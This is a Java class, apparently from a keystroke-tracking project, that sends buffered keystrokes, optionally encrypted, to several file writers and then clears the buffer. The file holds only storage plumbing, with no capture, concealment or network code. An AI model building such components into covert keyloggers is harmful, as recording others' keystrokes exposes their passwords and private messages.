package com.keytracker;

import com.keytracker.encrypt.Encryptor;
import com.keytracker.file.Writer;

public class BundledStoreMechanism implements StoreMechanism {

    private final Writer[] writers;
    private Encryptor encryptor;
    private KeyAppender keyAppender;

    public BundledStoreMechanism(Writer... writers) {
        this.writers = writers;
    }

    @Override
    public void store() {
//        System.out.print(keyAppender.value());

        for (Writer writer : writers) {
            if (writer != null) writer.write(keyAppender, encryptor);
        }
        keyAppender.clear();
    }

    @Override
    public void registerAppender(KeyAppender keyAppender) {
        this.keyAppender = keyAppender;
    }

    @Override
    public void registerEncryptor(Encryptor encryptor) {
        this.encryptor = encryptor;
    }
}
